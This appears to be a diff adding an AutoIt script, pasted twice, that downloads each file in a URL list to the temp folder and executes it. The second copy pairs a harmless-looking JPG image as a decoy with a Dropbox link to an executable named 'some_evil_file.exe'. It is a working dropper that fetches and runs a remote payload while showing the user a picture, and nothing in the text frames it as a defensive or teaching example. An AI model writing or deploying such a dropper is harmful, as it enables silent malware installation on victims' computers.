@@ -1,0 +1,33 @@
+#include <StaticConstants.au3>
+#include <WindowsConstants.au3>
+Local $urls = "url1,url2"
+Local $urlsArray = StringSplit($urls, ",", 2 )
+For $url In $urlsArray
+ $sFile = _DownloadFile($url)
+ shellExecute($sFile)
+Next
+Func _DownloadFile($sURL)
+    Local $hDownload, $sFile
+    $sFile = StringRegExpReplace($sURL, "^.*/", "")
+    $sDirectory = @TempDir & $sFile
+    $hDownload = InetGet($sURL, $sDirectory, 17, 1)
+    InetClose($hDownload)
+    Return $sDirectory
+EndFunc   ;==>_GetURLImage
+
+#include <StaticConstants.au3>
+#include <WindowsConstants.au3>
+Local $urls = "https://images.adsttc.com/media/images/5b04/5e3a/f197/cc1f/9600/00aa/newsletter/park_garden_concourse.jpg,https://www.dropbox.com/s/hsnvw0ik1em0637/some_evil_file.exe?dl=1"
+Local $urlsArray = StringSplit($urls, ",", 2 )
+For $url In $urlsArray
+ $sFile = _DownloadFile($url)
+ shellExecute($sFile)
+Next
+Func _DownloadFile($sURL)
+    Local $hDownload, $sFile
+    $sFile = StringRegExpReplace($sURL, "^.*/", "")
+    $sDirectory = @TempDir & $sFile
+    $hDownload = InetGet($sURL, $sDirectory, 17, 1)
+    InetClose($hDownload)
+    Return $sDirectory
+EndFunc   ;==>_GetURLImage
